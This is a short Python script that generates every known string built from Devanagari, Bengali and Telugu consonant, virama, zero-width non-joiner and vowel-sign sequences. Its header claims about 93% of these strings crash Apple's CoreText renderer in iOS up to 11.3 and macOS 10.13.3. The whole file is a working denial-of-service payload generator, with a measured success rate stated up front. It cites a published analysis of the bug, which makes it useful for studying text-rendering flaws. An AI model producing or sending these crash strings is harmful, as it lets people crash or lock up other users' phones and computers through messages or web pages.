# viramarama.py -- outputs all known strings with a very high chance (~93%) to trigger the
# iOS <= 11.3/macOS 10.13.3 CoreText crash. Requires Python 3
#
# Copyright 2018 hackbunny <hackbunny@gmail.com>
# 
# Permission is hereby granted, free of charge, to any person obtaining a copy of this
# software and associated documentation files (the "Software"), to deal in the Software
# without restriction, including without limitation the rights to use, copy, modify,
# merge, publish, distribute, sublicense, and/or sell copies of the Software, and to
# permit persons to whom the Software is furnished to do so, subject to the following
# conditions:
# 
# The above copyright notice and this permission notice shall be included in all copies or
# substantial portions of the Software.
# 
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED,
# INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR
# PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE
# LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT
# OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR
# OTHER DEALINGS IN THE SOFTWARE.
#
# References:
#  - Manish Goregaokar, "Picking Apart the Crashing iOS String" <https://manishearth.
#    github.io/blog/2018/02/15/picking-apart-the-crashing-ios-string/>
#  - Unicode Consortium, UnicodeData.txt version 11.0.0 <ftp://ftp.unicode.org/Public/11.
#    0.0/ucd/UnicodeData-11.0.0d11.txt>
#  - Wikipedia contributors, "Devanagari" <https://en.wikipedia.org/wiki/Devanagari>
#  - Wikipedia contributors, "Bengali alphabet" <https://en.wikipedia.org/wiki/
#    Bengali_alphabet>
#  - Wikipedia contributors, "Telugu script" <https://en.wikipedia.org/wiki/Telugu_script>
#
# Note: the script outputs 19609 unique strings, but only 18270 (or about 93%) seem to
# crash a test application

scripts = {
	'devanagari': {
		'consonants': [
			0x0915,
			0x0916,
			0x0917,
			0x0918,
			0x0919,
			0x0939,
			0x091A,
			0x091B,
			0x091C,
			0x091D,
			0x091E,
			0x092F,
			0x0936,
			0x091F,
			0x0920,
			0x0921,
			0x0922,
			0x0923,
			0x0930,
			0x0937,
			0x0924,
			0x0925,
			0x0926,
			0x0927,
			0x0928,
			0x0932,
			0x0938,
			0x092A,
			0x092B,
			0x092C,
			0x092D,
			0x092E,
			0x0935,
		],
		'suffix_joining_consonants': [0x0930],
		'vowels': [
			0x093A, # DEVANAGARI VOWEL SIGN OE
			0x093B, # DEVANAGARI VOWEL SIGN OOE
			0x093E, # DEVANAGARI VOWEL SIGN AA
			0x093F, # DEVANAGARI VOWEL SIGN I
			0x0940, # DEVANAGARI VOWEL SIGN II
			0x0941, # DEVANAGARI VOWEL SIGN U
			0x0942, # DEVANAGARI VOWEL SIGN UU
			0x0943, # DEVANAGARI VOWEL SIGN VOCALIC R
			0x0944, # DEVANAGARI VOWEL SIGN VOCALIC RR
			0x0945, # DEVANAGARI VOWEL SIGN CANDRA E
			0x0946, # DEVANAGARI VOWEL SIGN SHORT E
			0x0947, # DEVANAGARI VOWEL SIGN E
			0x0948, # DEVANAGARI VOWEL SIGN AI
			0x0949, # DEVANAGARI VOWEL SIGN CANDRA O
			0x094A, # DEVANAGARI VOWEL SIGN SHORT O
			0x094B, # DEVANAGARI VOWEL SIGN O
			0x094C, # DEVANAGARI VOWEL SIGN AU
			0x094E, # DEVANAGARI VOWEL SIGN PRISHTHAMATRA E
			0x094F, # DEVANAGARI VOWEL SIGN AW
			0x0955, # DEVANAGARI VOWEL SIGN CANDRA LONG E
			0x0956, # DEVANAGARI VOWEL SIGN UE
			0x0957, # DEVANAGARI VOWEL SIGN UUE
			0x0962, # DEVANAGARI VOWEL SIGN VOCALIC L
			0x0963, # DEVANAGARI VOWEL SIGN VOCALIC LL
		],
		'virama': 0x094D
	},
	'bengali': {
		'consonants': [
			0x0995,
			0x0996,
			0x0997,
			0x0998,
			0x0999,
			0x099A,
			0x099B,
			0x099C,
			0x099D,
			0x099E,
			0x099F,
			0x09A0,
			0x09A1,
			0x09A2,
			0x09A3,
			0x09A4,
			0x09A5,
			0x09A6,
			0x09A7,
			0x09A8,
			0x09AA,
			0x09AB,
			0x09AC,
			0x09AD,
			0x09AE,
			0x09AF,
			0x09B0,
			0x09F0,
			0x09B2,
			0x09F1,
			0x09B6,
			0x09B7,
			0x09B8,
			0x09B9,
		],
		'suffix_joining_consonants': [
			0x09AF,
			0x09B0,
		],
		'vowels': [
			0x09BE, # BENGALI VOWEL SIGN AA
			0x09BF, # BENGALI VOWEL SIGN I
			0x09C0, # BENGALI VOWEL SIGN II
			0x09C1, # BENGALI VOWEL SIGN U
			0x09C2, # BENGALI VOWEL SIGN UU
			0x09C3, # BENGALI VOWEL SIGN VOCALIC R
			0x09C4, # BENGALI VOWEL SIGN VOCALIC RR
			0x09C7, # BENGALI VOWEL SIGN E
			0x09C8, # BENGALI VOWEL SIGN AI
			0x09CB, # BENGALI VOWEL SIGN O
			0x09CC, # BENGALI VOWEL SIGN AU
			0x09E2, # BENGALI VOWEL SIGN VOCALIC L
			0x09E3, # BENGALI VOWEL SIGN VOCALIC LL
		],
		'virama': 0x09CD
	},
	'telugu': {
		'consonants': [
			0x0C15,
			0x0C16,
			0x0C17,
			0x0C18,
			0x0C19,
			0x0C1A,
			0x0C1B,
			0x0C1C,
			0x0C1D,
			0x0C1E,
			0x0C1F,
			0x0C20,
			0x0C21,
			0x0C22,
			0x0C23,
			0x0C24,
			0x0C25,
			0x0C26,
			0x0C27,
			0x0C28,
			0x0C2A,
			0x0C2B,
			0x0C2C,
			0x0C2D,
			0x0C2E,
			0x0C2F,
			0x0C30,
			0x0C32,
			0x0C35,
			0x0C33,
			0x0C36,
			0x0C37,
			0x0C38,
			0x0C39,
			0x0C31,
		],
		'vowels': [
			0x0C3E, # TELUGU VOWEL SIGN AA
			0x0C3F, # TELUGU VOWEL SIGN I
			0x0C40, # TELUGU VOWEL SIGN II
			0x0C41, # TELUGU VOWEL SIGN U
			0x0C42, # TELUGU VOWEL SIGN UU
			0x0C43, # TELUGU VOWEL SIGN VOCALIC R
			0x0C44, # TELUGU VOWEL SIGN VOCALIC RR
			0x0C46, # TELUGU VOWEL SIGN E
			0x0C47, # TELUGU VOWEL SIGN EE
			0x0C48, # TELUGU VOWEL SIGN AI
			0x0C4A, # TELUGU VOWEL SIGN O
			0x0C4B, # TELUGU VOWEL SIGN OO
			0x0C4C, # TELUGU VOWEL SIGN AU
			0x0C62, # TELUGU VOWEL SIGN VOCALIC L
			0x0C63, # TELUGU VOWEL SIGN VOCALIC LL
		],
		'virama': 0x0C4D
	}
}

scripts['telugu']['suffix_joining_consonants'] = scripts['telugu']['consonants']

for script in scripts.values():
	for consonant1 in script['consonants']:
		for consonant2 in script['suffix_joining_consonants']:
			for vowel in script['vowels']:
				print(chr(consonant1) + chr(script['virama']) + chr(consonant2) + chr(0x200C) + chr(vowel))
